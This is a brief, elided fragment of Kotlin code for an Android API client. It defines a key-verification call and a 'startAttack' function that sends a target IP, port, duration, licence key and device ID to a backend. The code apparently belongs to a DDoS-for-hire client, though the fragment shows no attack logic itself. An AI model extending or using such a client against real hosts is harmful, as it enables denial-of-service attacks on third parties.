...
object ApiClient {
    ...
    suspend fun verifyKey(context: Context, key: String): VerificationResult = kotlinx.coroutines.withContext(kotlinx.coroutines.Dispatchers.IO) {
    ...
    suspend fun startAttack(context: Context, key: String, ip: String, port: Int, duration: Int): AttackResult = kotlinx.coroutines.withContext(kotlinx.coroutines.Dispatchers.IO) {
        val baseUrl = getBaseUrl()
        val json = JSONObject().apply {
            put("key", key)
            put("device_id", getDeviceId(context))
